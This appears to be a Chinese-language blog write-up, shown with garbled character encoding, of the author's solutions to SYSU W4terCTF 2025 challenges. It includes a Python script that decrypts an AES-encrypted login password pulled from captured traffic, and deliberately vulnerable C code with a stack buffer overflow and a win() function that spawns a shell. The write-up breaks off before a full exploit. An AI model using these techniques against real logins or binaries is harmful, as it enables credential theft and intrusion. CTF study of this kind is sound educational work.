<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SYSU W4terCTF 2025 | Tech_Islet</title><meta name="author" content="è˜‹æœ«é£"><meta name="copyright" content="è˜‹æœ«é£"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Hack for fun not for profit_  ä»¥ä¸‹æ˜¯æˆ‘åœ¨ Team Nooob é˜Ÿä¼ä¸­è´Ÿè´£çš„é¢˜ç›®ã€‚  ç­¾åˆ°é—®å· å‘¨ä¸€12ç‚¹å¼€èµ›ï¼Œä¸‹åˆè¾¹ä¸Šè¯¾è¾¹åšï¼Œæ‹¿ä¸‹é˜Ÿä¼é¦–è¡€ ğŸ˜ƒ è¿™é“é¢˜æŠŠ flag ç¡¬ç¼–ç æˆ–ç›´æ¥åŒ…å«åœ¨å®¢æˆ·ç«¯å¯ä»¥è·å–çš„åˆå§‹åŒ–æ•°æ®ä¸­ã€‚è™½ç„¶é¢˜é¢æè¿°äº†æˆªæ­¢æ—¶é—´é”™è¯¯å’Œæäº¤åæç¤ºè¯­ï¼Œçœ‹èµ·æ¥åƒæ˜¯éœ€è¦å®Œæˆæäº¤æˆ–ç»•è¿‡æ—¶é—´æ£€æŸ¥ï¼Œä½†å®é™…ä¸Šï¼ŒFlag å¹¶æ²¡æœ‰è¢«åŠ¨æ€ç”Ÿæˆæˆ–åœ¨æäº¤åæ‰ä»æœåŠ¡å™¨è¿”å›ã€‚ çœŸæ­£çš„è§£">
<meta property="og:type" content="article">
<meta property="og:title" content="SYSU W4terCTF 2025">
<meta property="og:url" content="http://example.com/2025/04/28/SYSU%20W4terCTF%202025/index.html">
<meta property="og:site_name" content="Tech_Islet">
<meta property="og:description" content="Hack for fun not for profit_  ä»¥ä¸‹æ˜¯æˆ‘åœ¨ Team Nooob é˜Ÿä¼ä¸­è´Ÿè´£çš„é¢˜ç›®ã€‚  ç­¾åˆ°é—®å· å‘¨ä¸€12ç‚¹å¼€èµ›ï¼Œä¸‹åˆè¾¹ä¸Šè¯¾è¾¹åšï¼Œæ‹¿ä¸‹é˜Ÿä¼é¦–è¡€ ğŸ˜ƒ è¿™é“é¢˜æŠŠ flag ç¡¬ç¼–ç æˆ–ç›´æ¥åŒ…å«åœ¨å®¢æˆ·ç«¯å¯ä»¥è·å–çš„åˆå§‹åŒ–æ•°æ®ä¸­ã€‚è™½ç„¶é¢˜é¢æè¿°äº†æˆªæ­¢æ—¶é—´é”™è¯¯å’Œæäº¤åæç¤ºè¯­ï¼Œçœ‹èµ·æ¥åƒæ˜¯éœ€è¦å®Œæˆæäº¤æˆ–ç»•è¿‡æ—¶é—´æ£€æŸ¥ï¼Œä½†å®é™…ä¸Šï¼ŒFlag å¹¶æ²¡æœ‰è¢«åŠ¨æ€ç”Ÿæˆæˆ–åœ¨æäº¤åæ‰ä»æœåŠ¡å™¨è¿”å›ã€‚ çœŸæ­£çš„è§£">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/avatar.jpg">
<meta property="article:published_time" content="2025-04-28T04:48:37.447Z">
<meta property="article:modified_time" content="2025-05-05T12:03:10.967Z">
<meta property="article:author" content="è˜‹æœ«é£">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><link rel="shortcut icon" href="../../../../img/crown.png"><link rel="canonical" href="http://example.com/2025/04/28/SYSU%20W4terCTF%202025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="../../../../css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SYSU W4terCTF 2025',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-05-05 20:03:10'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="atom.xml" title="Tech_Islet" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="../../../../img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="../../../../archives/"><div class="headline">æ–‡ç« </div><div class="length-num">23</div></a><a href="../../../../tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">0</div></a><a href="../../../../categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="../../../../index.html"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="../../../../archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="../../../../about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://wallpaperaccess.com/full/8045532.png')"><nav id="nav"><span id="blog-info"><a href="../../../../index.html" title="Tech_Islet"><span class="site-name">Tech_Islet</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="../../../../index.html"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="../../../../archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="../../../../about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SYSU W4terCTF 2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2025-04-28T04:48:37.447Z" title="å‘è¡¨äº 2025-04-28 12:48:37">2025-04-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-05-05T12:03:10.967Z" title="æ›´æ–°äº 2025-05-05 20:03:10">2025-05-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SYSU W4terCTF 2025"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>Hack for fun not for profit_</p>
</blockquote>
<p>ä»¥ä¸‹æ˜¯æˆ‘åœ¨ Team Nooob é˜Ÿä¼ä¸­è´Ÿè´£çš„é¢˜ç›®ã€‚</p>
<h1 id="ç­¾åˆ°é—®å·"><a class="markdownIt-Anchor" href="#ç­¾åˆ°é—®å·"></a> ç­¾åˆ°é—®å·</h1>
<p>å‘¨ä¸€12ç‚¹å¼€èµ›ï¼Œä¸‹åˆè¾¹ä¸Šè¯¾è¾¹åšï¼Œæ‹¿ä¸‹é˜Ÿä¼é¦–è¡€ ğŸ˜ƒ</p>
<p>è¿™é“é¢˜æŠŠ flag ç¡¬ç¼–ç æˆ–ç›´æ¥åŒ…å«åœ¨å®¢æˆ·ç«¯å¯ä»¥è·å–çš„åˆå§‹åŒ–æ•°æ®ä¸­ã€‚è™½ç„¶é¢˜é¢æè¿°äº†æˆªæ­¢æ—¶é—´é”™è¯¯å’Œæäº¤åæç¤ºè¯­ï¼Œçœ‹èµ·æ¥åƒæ˜¯éœ€è¦å®Œæˆæäº¤æˆ–ç»•è¿‡æ—¶é—´æ£€æŸ¥ï¼Œä½†å®é™…ä¸Šï¼ŒFlag å¹¶æ²¡æœ‰è¢«åŠ¨æ€ç”Ÿæˆæˆ–åœ¨æäº¤åæ‰ä»æœåŠ¡å™¨è¿”å›ã€‚</p>
<p>çœŸæ­£çš„è§£é¢˜è·¯å¾„æ˜¯ï¼š</p>
<ul>
<li><strong>è¯†åˆ«</strong> é¡µé¢åŠ è½½æ—¶è·å–çš„å…³é”®åˆå§‹åŒ–æ•°æ®ï¼ˆé€šå¸¸åœ¨ script æ ‡ç­¾æˆ–é€šè¿‡ AJAX è¯·æ±‚è·å–ï¼‰ã€‚</li>
<li><strong>è§£ç </strong> æ•°æ®ï¼ˆå¦‚æœè¢«ç¼–ç ï¼‰ã€‚</li>
<li><strong>åˆ†æ</strong> è§£ç åçš„æ•°æ®ç»“æ„ï¼Œå¯»æ‰¾ä¸é—®å·çŠ¶æ€ã€æµç¨‹æ§åˆ¶æˆ–ç»“æŸ/æˆåŠŸæç¤ºç›¸å…³çš„å­—æ®µã€‚</li>
<li><strong>ç›´æ¥</strong> åœ¨ç›¸å…³çš„å­—æ®µå€¼ä¸­æŸ¥æ‰¾ Flagã€‚</li>
</ul>
<p><code>end_of_survey</code> å­—æ®µæ°å¥½å°±æ‰¿æ‹…äº†â€œé—®å·ç»“æŸæ—¶æ˜¾ç¤ºçš„æç¤ºè¯­â€çš„è§’è‰²ï¼Œå¹¶ä¸” LilRan â€œä¸å°å¿ƒâ€å°† Flag ç›´æ¥æ”¾åˆ°äº†è¿™é‡Œï¼Œè€Œ<strong>ä¸æ˜¯åœ¨è§¦å‘æ˜¾ç¤ºåæ‰åŠ¨æ€åŠ è½½æˆ–ç”Ÿæˆ</strong>ã€‚å› æ­¤ï¼Œç»•è¿‡æäº¤æˆ–æ—¶é—´æ£€æŸ¥çš„å¤æ‚æ­¥éª¤å˜å¾—ä¸å¿…è¦ï¼ŒFlag <strong>ç›´æ¥é€šè¿‡åˆ†æé¡µé¢åˆå§‹åŒ–æ•°æ®</strong>å°±è·å–åˆ°äº†ã€‚<br>
<img src="/2025/04/28/SYSU%20W4terCTF%202025/survey.png" alt="survey.png"></p>
<h1 id="ç®¡ç†å‘˜çš„å¯†ç "><a class="markdownIt-Anchor" href="#ç®¡ç†å‘˜çš„å¯†ç "></a> ç®¡ç†å‘˜çš„å¯†ç </h1>
<p>WireSharkåˆ†ææµé‡åŒ…ä¸­ç”¨æˆ·ç™»å½•æˆåŠŸçš„æŠ¥æ–‡ï¼Œæ‰¾åˆ°åŠ å¯†åçš„å¯†ç ï¼š<br>
<img src="/2025/04/28/SYSU%20W4terCTF%202025/shark.png" alt="shark.png"></p>
<p>å‰ç«¯<code>CD3Iylek.js</code>ä¸­æ˜¾ç¤ºäº†åŠ å¯†ç®—æ³• AES ä¸åŠ å¯†æ¨¡å¼ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">const</span> o = <span class="keyword">new</span> <span class="title class_">Date</span></span><br><span class="line">             , h = <span class="string">`<span class="subst">$&#123;o.getFullYear()&#125;</span>:<span class="subst">$&#123;o.getMonth() + <span class="number">1</span>&#125;</span>:<span class="subst">$&#123;o.getDate()&#125;</span>:<span class="subst">$&#123;o.getHours()&#125;</span>:<span class="subst">$&#123;o.getMinutes()&#125;</span>#`</span></span><br><span class="line">             , t = h0.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">parse</span>(<span class="string">&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</span>)</span><br><span class="line">             , a = h0.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">parse</span>(<span class="string">&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</span>)</span><br><span class="line">             , f = h0.<span class="property">AES</span>.<span class="title function_">encrypt</span>(h + l, t, &#123;</span><br><span class="line">               <span class="attr">iv</span>: a,</span><br><span class="line">               <span class="attr">mode</span>: h0.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">               <span class="attr">padding</span>: h0.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">           &#125;).<span class="title function_">toString</span>();</span><br><span class="line">           <span class="keyword">await</span> kx.<span class="property">account</span>.<span class="title function_">accountLoginCreate</span>(&#123;</span><br><span class="line">               <span class="attr">userName</span>: R,</span><br><span class="line">               <span class="attr">password</span>: f</span><br><span class="line">           &#125;),</span><br><span class="line">   <span class="comment">// ....</span></span><br></pre></td></tr></table></figure>
<ol>
<li>é¦–å…ˆè·å–å½“å‰çš„æ—¥æœŸå’Œæ—¶é—´ï¼ˆå¹´ã€æœˆã€æ—¥ã€æ—¶ã€åˆ†ï¼‰ï¼Œå¹¶æ ¼å¼åŒ–æˆ <code>YYYY:M:D:H:M#</code> çš„å­—ç¬¦ä¸²ï¼ˆå­˜å‚¨åœ¨å˜é‡ <code>h</code> ä¸­ï¼‰ã€‚</li>
<li>å®šä¹‰äº†ä¸¤ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸² <code>&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</code> å’Œ <code>&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</code>ï¼Œå¹¶å°†å®ƒä»¬è§£ææˆå­—èŠ‚æ•°ç»„ã€‚è¿™å¾ˆæ˜æ˜¾æ˜¯ AES åŠ å¯†çš„ <strong>å¯†é’¥ (Key)</strong> å’Œ <strong>åˆå§‹åŒ–å‘é‡ (IV)</strong>ã€‚</li>
<li>å°†å‰é¢ç”Ÿæˆçš„æ—¶é—´å­—ç¬¦ä¸² <code>h</code> ä¸å¦ä¸€ä¸ªå˜é‡ <code>l</code> æ‹¼æ¥èµ·æ¥ã€‚æ ¹æ®ä¸Šä¸‹æ–‡å’Œé€šå¸¸çš„ç™»å½•é€»è¾‘ï¼Œè¿™ä¸ª <code>l</code> å°±æ˜¯ç”¨æˆ·åœ¨å¯†ç è¾“å…¥æ¡†ä¸­è¾“å…¥çš„ <strong>åŸå§‹å¯†ç </strong>ã€‚</li>
<li>ä½¿ç”¨ <code>h0.AES.encrypt</code> æ–¹æ³•å¯¹æ‹¼æ¥åçš„ <code>h + l</code> å­—ç¬¦ä¸²è¿›è¡Œ AES åŠ å¯†ã€‚åŠ å¯†é…ç½®ä½¿ç”¨äº† <code>t</code> ä½œä¸ºå¯†é’¥ï¼Œ<code>a</code> ä½œä¸º IVï¼ŒåŠ å¯†æ¨¡å¼æ˜¯ <strong>CBC (Cipher Block Chaining)</strong>ï¼Œå¡«å……æ–¹å¼æ˜¯ <strong>Pkcs7</strong>ã€‚</li>
<li>åŠ å¯†ç»“æœ <code>.toString()</code> è½¬æ¢æˆ Base64 å­—ç¬¦ä¸²ã€‚è¿™ä¸ªç»“æœå­˜å‚¨åœ¨å˜é‡ <code>f</code> ä¸­ã€‚</li>
<li>æœ€åï¼Œå°† <code>f</code> ä½œä¸º <code>password</code> å‚æ•°å‘é€ç»™ <code>accountLoginCreate</code> æ¥å£ã€‚</li>
</ol>
<p>è€Œä»æµé‡åŒ…ä¸­æŠ“åˆ°çš„<code>gBjV3cE/UXEm7fXGXbQ4Ox00P0zOdz0LgVaTt5iTrNhaPX81IWdsVWEA1r56LkGobiHaOvhswbVxMUypSZpWpfiGNe5wXcDbl1JuFEZDC4A=</code> å°±æ˜¯è¿™ä¸ªç»è¿‡ <strong>æ—¶é—´æ‹¼æ¥ã€AES åŠ å¯†ã€Base64 ç¼–ç </strong> åçš„ <code>f</code> å˜é‡çš„å€¼ï¼</p>
<p>æ‰€ä»¥è¿‡ç¨‹å°†æ˜¯ï¼šBase64 è§£ç  --&gt; AES è§£å¯† --&gt; æå–å¯†ç  <code>YYYY:M:D:H:M#åŸå§‹å¯†ç </code>ï¼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">encrypted_b64 = <span class="string">&quot;gBjV3cE/UXEm7fXGXbQ4Ox00P0zOdz0LgVaTt5iTrNhaPX81IWdsVWEA1r56LkGobiHaOvhswbVxMUypSZpWpfiGNe5wXcDbl1JuFEZDC4A=&quot;</span></span><br><span class="line">key_hex = <span class="string">&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</span></span><br><span class="line">iv_hex = <span class="string">&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. Base64 è§£ç </span></span><br><span class="line">encrypted_data = base64.b64decode(encrypted_b64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°† Hex æ ¼å¼çš„ Key å’Œ IV è½¬æ¢ä¸ºå­—èŠ‚ä¸²</span></span><br><span class="line">key = unhexlify(key_hex)</span><br><span class="line">iv = unhexlify(iv_hex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. AES è§£å¯†</span></span><br><span class="line"><span class="comment"># åˆ›å»º AES è§£å¯†å™¨å¯¹è±¡</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># è§£å¯†ï¼Œå¹¶è¿›è¡Œ PKCS7 å¡«å……ç§»é™¤</span></span><br><span class="line">decrypted_padded_data = cipher.decrypt(encrypted_data)</span><br><span class="line">decrypted_data = unpad(decrypted_padded_data, AES.block_size)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># å°†è§£å¯†åçš„å­—èŠ‚ä¸²è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">decrypted_string = decrypted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. æå–å¯†ç </span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> decrypted_string:</span><br><span class="line">Â  Â  original_password = decrypted_string.split(<span class="string">&#x27;#&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">f&quot;æˆåŠŸè§£å¯†å‡ºçš„åŸå§‹å¯†ç  (Flag): <span class="subst">&#123;original_password&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">&quot;è§£å¯†åçš„æ•°æ®æ ¼å¼ä¸æ­£ç¡®ï¼Œæœªæ‰¾åˆ° &#x27;#&#x27; åˆ†éš”ç¬¦ã€‚&quot;</span>)</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">f&quot;è§£å¯†åçš„æ•°æ®: <span class="subst">&#123;decrypted_string&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/28/SYSU%20W4terCTF%202025/passwd.png" alt="passwd.png"></p>
<h1 id="wmc25-d0"><a class="markdownIt-Anchor" href="#wmc25-d0"></a> WMC25 D0</h1>
<p>åŸæœ¬ä»¥ä¸ºè¦ç”¨æ ˆæº¢å‡ºæ¥ call <code>win</code>ï¼Œæ²¡æƒ³åˆ°ç©å®Œæ‰«é›·å°±ç»™äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">Â  <span class="type">char</span> buf[<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line">Â  <span class="built_in">printf</span>(<span class="string">&quot;You win! Please sign your name: &quot;</span>);</span><br><span class="line">Â  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">Â  Â  read(<span class="number">0</span>, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;\nLeaderboard\n&quot;</span>);</span><br><span class="line">Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;01 %16s ... %ds\n\n&quot;</span>, buf, last);</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">Â  Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;Your name is too long, which will break our award ceremony!\n&quot;</span>);</span><br><span class="line">Â  Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;Just give us another shorter nickname: &quot;</span>);</span><br><span class="line">Â  Â  &#125; <span class="keyword">else</span></span><br><span class="line">Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  &#125;</span><br><span class="line">Â  <span class="built_in">printf</span>(<span class="string">&quot;Thanks for playing my game.\n&quot;</span>);</span><br><span class="line">Â  win();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/28/SYSU%20W4terCTF%202025/wmc.png" alt="wmc.png"></p>
<h1 id="wmc25-d1"><a class="markdownIt-Anchor" href="#wmc25-d1"></a> WMC25 D1</h1>
<p>ä¸‹ä¸€ level å°±æŠŠ <code>win()</code> ç»™å»æ‰äº†ï¼Œæˆ‘ä»¬ç°åœ¨éœ€è¦è¿›è¡Œæ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;      <span class="comment">// åé—¨å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">Â  <span class="type">char</span> buf[<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line">Â  <span class="built_in">printf</span>(<span class="string">&quot;You win! Please sign your name: &quot;</span>);</span><br><span class="line">Â  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">Â  Â  read(<span class="number">0</span>, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;\nLeaderboard\n&quot;</span>);</span><br><span class="line">Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;01 %16s ... %ds\n\n&quot;</span>, buf, last);</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">Â  Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;Your name is too long, which will break our award ceremony!\n&quot;</span>);</span><br><span class="line">Â  Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;Just give us another shorter nickname: &quot;</span>);</span><br><span class="line">Â  Â  &#125; <span class="keyword">else</span></span><br><span class="line">Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  &#125;</span><br><span class="line">Â  <span class="built_in">printf</span>(<span class="string">&quot;Thanks for playing my game.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶é€šè¿‡ <code>checksec</code> çŸ¥é“ç¨‹åº<strong>å¼€å¯äº† Canary æ ˆä¿æŠ¤</strong>ã€‚</p>
